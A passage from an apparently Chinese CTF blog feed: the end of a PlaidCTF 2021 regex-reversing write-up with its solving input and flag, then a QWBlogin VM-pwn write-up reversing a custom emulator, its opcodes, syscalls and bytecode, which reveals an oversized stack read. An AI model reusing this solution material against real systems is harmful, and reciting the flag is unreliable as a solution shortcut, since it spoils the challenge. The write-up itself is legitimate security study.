Alt( Lit(<span class="hljs-string">&quot;af&quot;</span>), Lit(<span class="hljs-string">&quot;73&quot;</span>), 数字+Lit(<span class="hljs-string">&quot;a&quot;</span>), Lit(<span class="hljs-string">&quot;ccc&quot;</span>), Fan([<span class="hljs-number">0</span><span class="hljs-number">-9</span>], <span class="hljs-number">7</span>) )  )          af <span class="hljs-number">73</span> 数字+a ccc 都不能出现 数字也不能连续超过<span class="hljs-number">7</span>个   Neg( Alt( Lit(<span class="hljs-string">&quot;a&quot;</span>), Fan([<span class="hljs-number">0</span><span class="hljs-number">-9</span>], <span class="hljs-number">6</span>)))                   a 不能出现 数字不能连续超过<span class="hljs-number">6</span>个<span class="hljs-number">7.</span> Neg( Neg(Null) + Fan([a-f]+Neg(Null), <span class="hljs-number">6</span>))                                    字母不能超过<span class="hljs-number">6</span>个<span class="hljs-number">8.</span> Consider(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,a,b,c,d,e,f, <span class="hljs-number">0</span>,<span class="hljs-number">7777</span>,<span class="hljs-number">73331</span>)</code></pre><h2 id="大致推测"><a href="#大致推测" class="headerlink" title="大致推测"></a>大致推测</h2><p>1 4 7得 <code>cdb</code> 的串长度只能为 4且只能为 <code>[b-f]cdb | cdb[cef]</code></p><p>主要4可以知道基本上是<code>数字+字符+数字+字符</code>的模式，又字符不能超过6个且连续的字符必须是1或者4个，因此要么是<code>1+4</code>要么是<code>4+1</code></p><p>再判断一下数字只能是<code>2+2 | 2+5 | 5+2 | 5+5</code>，又需要出现三次<code>10</code>，因此只能<code>[1010x|10x10|10] + [10xxx|x10xx|xx10x|xxx10]</code>或者这两个的顺序可以反过来即前面是一个<code>10</code>后面是两个<code>10</code></p><p> 因此<code>(a, b, c, d)</code>中</p><pre><code class="hljs apache"><span class="hljs-attribute">a</span>: <span class="hljs-number">1010</span>x | <span class="hljs-number">10</span>x<span class="hljs-number">10</span> | <span class="hljs-number">10</span><span class="hljs-attribute">b</span>:<span class="hljs-meta"> [b-f]cdb | cbd[cef]</span><span class="hljs-attribute">c</span>: <span class="hljs-number">10</span>xxx | x<span class="hljs-number">10</span>xx | xx<span class="hljs-number">10</span>x | xxx<span class="hljs-number">10</span><span class="hljs-attribute">d</span>: bcd</code></pre><p>且<code>a c</code>可交换，<code>b d</code>可交换，然后必须要<code>10</code>开头，必须要3个<code>10</code>，不能出现<code>73</code>，且两个<code>Consider</code>需要满足</p><p>因此可以写出脚本爆破，最后可以得到一堆可能的解</p><p>最后可行的结果</p><pre><code class="hljs apache"><span class="hljs-attribute">cough</span><span class="hljs-attribute">10174cdbf10810c</span><span class="hljs-attribute">PCTF</span>&#123;a_pr<span class="hljs-number">1</span>m<span class="hljs-number">3</span>_a_day_k<span class="hljs-number">33</span>ps_th<span class="hljs-number">3</span>_D<span class="hljs-number">0</span>ctor_Firmly_Away&#125;</code></pre><p>附上题目和脚本 <a href="https://github.com/Vang3lis/CTF_repo/tree/master/PlaidCTF_2021/dr">dr</a></p><p>我的脚本写的十分的暴力（无限套for循环），巨神写的就很简单</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>reg</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>QWBlogin &amp; GACTF vmpwn</title>
    <link href="/2020/09/02/qwblogin%20&amp;%20GACTF%20vmpwn/"/>
    <url>/2020/09/02/qwblogin%20&amp;%20GACTF%20vmpwn/</url>
    
    <content type="html"><![CDATA[<p>强网杯的一个虚拟机的题目，之前做过虚拟机的题目但是都没做出来，这次打比赛的时候由于有其他的事情，就做了一点就没做了，然后今天把这个题目磨出来了。</p><p>打完 <code>GACTF2020</code> 之后把其中的<code>vmpwn</code>也添加在此</p><h2 id="QWBlogin"><a href="#QWBlogin" class="headerlink" title="QWBlogin"></a>QWBlogin</h2><p>该题给了一个 <code>emulator</code>虚拟机，运行的类似机器码的<code>test.bin</code>和<code>launch.sh</code>，之后<code>tips</code>的时候给了<code>Instruction.h</code></p><h3 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h3><h4 id="main-函数"><a href="#main-函数" class="headerlink" title="main 函数"></a>main 函数</h4><p>基本上程序运行依靠一个虚拟机的结构体，可以从<code>main</code>里面看到就是 <code>v9</code>结构体，后文会将介绍该结构体</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span></span><span class="hljs-function"></span>&#123;    len = sub_ba0(argv[<span class="hljs-number">1</span>]);    <span class="hljs-keyword">if</span>(len &lt;= <span class="hljs-number">0</span>)        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);        fd = open(argv[<span class="hljs-number">1</span>], <span class="hljs-number">0</span>);    <span class="hljs-keyword">if</span>(fd &lt; <span class="hljs-number">0</span>)        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);        v8 = mmap(<span class="hljs-number">0</span>, len, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, fd, <span class="hljs-number">0</span>);    <span class="hljs-keyword">if</span>(!v8)        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);        <span class="hljs-comment">// check image format</span>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">memcmp</span>(v8, <span class="hljs-string">&quot;\x61\xde\x10\ef&quot;</span>, <span class="hljs-number">4</span>))        <span class="hljs-built_in">exit</span>(<span class="hljs-number">2</span>);        <span class="hljs-comment">// check lenth</span>    <span class="hljs-comment">// segment?</span>    <span class="hljs-comment">// v8[6, 14) ~ [14, 22) lenth</span>    <span class="hljs-keyword">if</span>( *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">6</span>) &gt; len || *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">14</span>) &gt; len - *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">6</span>) )        <span class="hljs-built_in">exit</span>(<span class="hljs-number">3</span>);        <span class="hljs-comment">// v8[22, 30) ~ [30, 38)</span>    <span class="hljs-keyword">if</span>( *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">22</span>) &gt; len || *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">30</span>) &gt; len - *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">22</span>) )        <span class="hljs-built_in">exit</span>(<span class="hljs-number">4</span>);    <span class="hljs-comment">// v[38, 46) &gt; v8[14, 22)</span>    <span class="hljs-keyword">if</span>( *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">38</span>) &gt;= *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">14</span>) )         <span class="hljs-built_in">exit</span>(<span class="hljs-number">5</span>);    v9 = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">0xD0</span>, <span class="hljs-number">1</span>);    <span class="hljs-comment">// v[6, 14) == offset v&#123;14, 22) == segment_size</span>    <span class="hljs-comment">// v9[21] = calloc(1, v8[14, 22)) 0x1000 向上取整</span>    v9[<span class="hljs-number">21</span>] = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, v8[<span class="hljs-number">14</span>, <span class="hljs-number">22</span>))    <span class="hljs-built_in">memcpy</span>(v9[<span class="hljs-number">21</span>], &amp;(v8[v8[<span class="hljs-number">6</span>, <span class="hljs-number">14</span>)]),  v8[<span class="hljs-number">14</span>, <span class="hljs-number">22</span>))    v[<span class="hljs-number">20</span>] = segment_size;    <span class="hljs-comment">// </span>    v9[<span class="hljs-number">23</span>] = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, v8[<span class="hljs-number">30</span>, <span class="hljs-number">38</span>))    <span class="hljs-built_in">memcpy</span>(v9[<span class="hljs-number">23</span>], &amp;(v8[v8[<span class="hljs-number">22</span>, <span class="hljs-number">30</span>)]), v8[<span class="hljs-number">30</span>, <span class="hljs-number">38</span>))    v9[<span class="hljs-number">22</span>] = segment_size;     v9[<span class="hljs-number">25</span>] = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0x20</span> <span class="hljs-number">000</span>);    v9[<span class="hljs-number">24</span>] = <span class="hljs-number">0x20</span> <span class="hljs-number">000</span>;    v9[<span class="hljs-number">18</span>] = v8[<span class="hljs-number">38</span>, <span class="hljs-number">46</span>)    g_Var = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">0x18</span>, <span class="hljs-number">1</span>);    <span class="hljs-built_in">memset</span>(g_Var, <span class="hljs-number">0x18</span>, <span class="hljs-number">0</span>);    <span class="hljs-comment">//链表结构 可能记录 segment flag 的</span>    <span class="hljs-comment">// g_Var[0x10, 0x18) -&gt; struct_18 -&gt; struct_18;</span>                  <span class="hljs-keyword">while</span>(!sub_c1a(v9))    &#123;&#125;&#125;</code></pre><p>然后进入<code>c1a</code>结构体的时候，会发现<code>IDA</code>报出该函数太大无法分析，只能另外用<code>Ghidra</code>看能不能分析，然后发现能够反编译，于是对其进行<code>dump</code>反编译的文本进行分析</p><h4 id="VM-struct"><a href="#VM-struct" class="headerlink" title="VM struct"></a>VM struct</h4><p>其中关键的结构体被逆出来是如下</p><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VM</span></span><span class="hljs-class">&#123;</span>    <span class="hljs-keyword">int64_t</span> r00;    <span class="hljs-keyword">int64_t</span> r01;    <span class="hljs-keyword">int64_t</span> r02;    <span class="hljs-keyword">int64_t</span> r03;    <span class="hljs-keyword">int64_t</span> r04;    <span class="hljs-keyword">int64_t</span> r05;    <span class="hljs-keyword">int64_t</span> r06;    <span class="hljs-keyword">int64_t</span> r07;    <span class="hljs-keyword">int64_t</span> r08;    <span class="hljs-keyword">int64_t</span> r09;    <span class="hljs-keyword">int64_t</span> r0a;    <span class="hljs-keyword">int64_t</span> r0b;    <span class="hljs-keyword">int64_t</span> r0c;    <span class="hljs-keyword">int64_t</span> r0d;    <span class="hljs-keyword">int64_t</span> r0e;    <span class="hljs-keyword">int64_t</span> r0f;    <span class="hljs-keyword">int64_t</span> r10;    <span class="hljs-keyword">int64_t</span> r11;    <span class="hljs-keyword">int64_t</span> pc;             <span class="hljs-comment">// vm[0x12]</span>    <span class="hljs-keyword">int64_t</span> flags;          <span class="hljs-comment">// vm[0x13]</span>    <span class="hljs-keyword">int64_t</span> text_size;      <span class="hljs-comment">// vm[0x14]</span>    <span class="hljs-keyword">int64_t</span> text_segment;   <span class="hljs-comment">// vm[0x15]</span>    <span class="hljs-keyword">int64_t</span> data_size;      <span class="hljs-comment">// vm[0x16]</span>    <span class="hljs-keyword">int64_t</span> data_segment;   <span class="hljs-comment">// vm[0x17]</span>    <span class="hljs-keyword">int64_t</span> io_file;        <span class="hljs-comment">// 0x18 struct (int_no=0) -&gt; 0x18 (int_no=1) -&gt; 0x18 (int_no=2)</span>    <span class="hljs-keyword">int64_t</span> <span class="hljs-built_in">stack</span>;          <span class="hljs-comment">// vm[0x19]</span>    <span class="hljs-comment">// int64_t </span>&#125;;</code></pre><p>前面是寄存器，后面是一些段和存储的<code>io_file</code>链和虚拟的栈</p><h4 id="op-1"><a href="#op-1" class="headerlink" title="op[1]"></a>op[1]</h4><p>在<code>0xc1a</code>程序的开始先会判断当前<code>op</code>是否<code>&lt;2</code>如果<code>&lt;2</code>则退出，说明每一个指令至少都有两个字节，之后用了<code>op[1]&amp;0xf</code>进行<code>switch case</code>判断当前指令长度</p><pre><code class="hljs c"><span class="hljs-keyword">switch</span> op[<span class="hljs-number">1</span>]&amp;<span class="hljs-number">0xf</span>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0b</span>, <span class="hljs-number">0xc</span>, <span class="hljs-number">0xd</span>, <span class="hljs-number">0xe</span>,         <span class="hljs-number">4</span>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x01</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x04</span>,        <span class="hljs-number">0xb</span>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x5</span>:        <span class="hljs-number">0x15</span>: <span class="hljs-keyword">int8_t</span> <span class="hljs-number">4</span>        <span class="hljs-number">0x25</span>: <span class="hljs-keyword">int16_t</span> <span class="hljs-number">5</span>        <span class="hljs-number">0x35</span>: <span class="hljs-keyword">int32_t</span> <span class="hljs-number">7</span>        <span class="hljs-number">0x45</span>: <span class="hljs-keyword">int64_t</span> <span class="hljs-number">0xb</span>     <span class="hljs-keyword">case</span> <span class="hljs-number">0x6</span>:        <span class="hljs-number">3</span>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x7</span>:        <span class="hljs-number">0x17</span>: <span class="hljs-keyword">int8_t</span> <span class="hljs-number">3</span>        <span class="hljs-number">0x27</span>: <span class="hljs-keyword">int16_t</span> <span class="hljs-number">4</span>        <span class="hljs-number">0x37</span>: <span class="hljs-keyword">int32_t</span> <span class="hljs-number">6</span>        <span class="hljs-number">0x47</span>: <span class="hljs-keyword">int64_t</span> <span class="hljs-number">10</span>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x8</span>:        <span class="hljs-keyword">if</span> op[<span class="hljs-number">0</span>] == <span class="hljs-number">0x20</span>:            <span class="hljs-number">2</span>        <span class="hljs-keyword">else</span>:            <span class="hljs-number">10</span>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x9</span>:        <span class="hljs-keyword">if</span> op[<span class="hljs-number">0</span>] != <span class="hljs-number">0x20</span> &amp;&amp; a[<span class="hljs-number">0x14</span>] - a[<span class="hljs-number">0x12</span>] &lt; <span class="hljs-number">10</span>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    <span class="hljs-keyword">case</span> <span class="hljs-number">0xa</span>:        <span class="hljs-number">2</span>    <span class="hljs-keyword">default</span>:        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;</code></pre><h4 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h4><p>在最开始的时候傻乎乎的顺着<code>dump</code>的函数逆，后来逆完<code>MOV</code>之后觉得其中<code>MUL/DIV/MOD</code>等一些内容都可以不用逆，然后我让一个学弟帮忙逆<code>XOR/OR/AND</code>等一些其他的，我去逆<code>JMP</code>这整个，后来觉得这个思路错了，其实如果<code>test.bin</code>的程序并没有自我修改的话，其实可以先根据<code>size</code>和<code>instrcution</code>把指令分了，再看是否需要逆一些指令，最后发现只有<code>mov pop push call ret jmp（中间少部分）syacall</code>需要很清楚的逆出来，其他的都可以不用逆。</p><h4 id="整理"><a href="#整理" class="headerlink" title="整理"></a>整理</h4><p>最后需要的每个的情况都整理成如下模式</p><pre><code class="hljs python"><span class="hljs-comment"># 20_syscall.c</span>switch op[<span class="hljs-number">0</span>]:// SYSCALL// size == <span class="hljs-number">2</span>case <span class="hljs-number">0x20</span>:    r00 == <span class="hljs-number">0</span>        op[<span class="hljs-number">1</span>] == <span class="hljs-number">0xa</span>                fd = open(data[r01], r02)        insert fd into vm.io_file    r00 == <span class="hljs-number">1</span>        op[<span class="hljs-number">1</span>]&amp;<span class="hljs-number">0xf</span> == <span class="hljs-number">0x8</span>:            read(r01, data[r02], r03)        op[<span class="hljs-number">1</span>]&amp;<span class="hljs-number">0xf</span> == <span class="hljs-number">0x9</span>            read(r01, stack[r02], r03)    r00 == <span class="hljs-number">2</span>        op[<span class="hljs-number">1</span>]&amp;<span class="hljs-number">0xf</span> == <span class="hljs-number">0x8</span>:            write(r01, data[r02], r03)                op[<span class="hljs-number">1</span>]&amp;<span class="hljs-number">0xf</span> == <span class="hljs-number">0x9</span>:            write(r01, stack[r02], r03)    r00 == <span class="hljs-number">3</span>        close(r01)</code></pre><h4 id="简易-emulator"><a href="#简易-emulator" class="headerlink" title="简易 emulator"></a>简易 emulator</h4><p>最后根据整理的<code>op[0] op[1]</code>进行编写简易的分开<code>test.bin</code>的程序</p><pre><code class="hljs x86asm">ov <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x45</span><span class="hljs-keyword">call</span> <span class="hljs-number">0x45</span> <span class="hljs-number">0x1</span> <span class="hljs-number">0x53</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0xa756f5920656553</span><span class="hljs-keyword">push</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r2</span>, r16<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x8</span><span class="hljs-keyword">syscall</span> stack<span class="hljs-keyword">hlt</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x23</span><span class="hljs-keyword">syscall</span> data<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x28</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0xb</span><span class="hljs-keyword">syscall</span> data<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">dword</span> <span class="hljs-number">0x40</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">syscall</span> data<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x40</span>]<span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x51</span>|Q<span class="hljs-keyword">je</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">hlt</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x40</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">syscall</span> data<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x40</span>]<span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x57</span>| W<span class="hljs-keyword">jne</span> <span class="hljs-number">0x3</span><span class="hljs-keyword">jmp</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">hlt</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x40</span>], <span class="hljs-built_in">r9</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">word</span> <span class="hljs-number">0</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">word</span> <span class="hljs-number">0x40</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">syscall</span> data<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x40</span>]<span class="hljs-keyword">xor</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x77</span><span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x26</span>| Q<span class="hljs-keyword">jne</span> <span class="hljs-number">0xffffffc9</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x40</span>], <span class="hljs-built_in">r9</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x48</span>], <span class="hljs-built_in">r9</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x50</span>], <span class="hljs-built_in">r9</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x58</span>], <span class="hljs-built_in">r9</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x60</span>], <span class="hljs-built_in">r9</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">word</span> <span class="hljs-number">0</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">word</span> <span class="hljs-number">0x40</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x21</span><span class="hljs-keyword">syscall</span> data| read(<span class="hljs-number">0</span>, data[<span class="hljs-number">0x40</span>], <span class="hljs-number">0x21</span>)<span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r8</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x40</span>]| G00DR3VR<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r9</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x427234129827abcd</span><span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r9</span><span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x10240740dc179b8a</span><span class="hljs-keyword">je</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">hlt</span><span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r8</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x48</span>]| W31LD0N3<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r9</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x127412341241dead</span><span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r9</span><span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x213a22705e70edfa</span><span class="hljs-keyword">je</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">hlt</span><span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r8</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x50</span>]| Try2Pwn!<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r9</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x8634965812abc123</span><span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r9</span><span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0xa75ae10820d2b377</span><span class="hljs-keyword">je</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">hlt</span><span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r8</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x58</span>]| GOGOGOGO<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r9</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x123216781236789a</span><span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r9</span><span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x5d75593f5d7137dd</span><span class="hljs-keyword">je</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">hlt</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x34</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x6</span><span class="hljs-keyword">syscall</span> data<span class="hljs-keyword">push</span> <span class="hljs-built_in">qword</span> r17<span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> r17, r16<span class="hljs-keyword">sub</span> r16, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x100</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r4</span>, r16<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r5</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0xa214f474f4721</span><span class="hljs-keyword">push</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r5</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r5</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x574f4e54494e5750</span><span class="hljs-keyword">push</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r5</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r5</span>, r16<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r2</span>, r16<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0xf</span><span class="hljs-keyword">syscall</span> stack<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">r4</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x800</span><span class="hljs-keyword">syscall</span> stack| read(<span class="hljs-number">0</span>, stack[], <span class="hljs-number">0x800</span>)<span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0</span>         <span class="hljs-keyword">jnl</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">hlt</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span 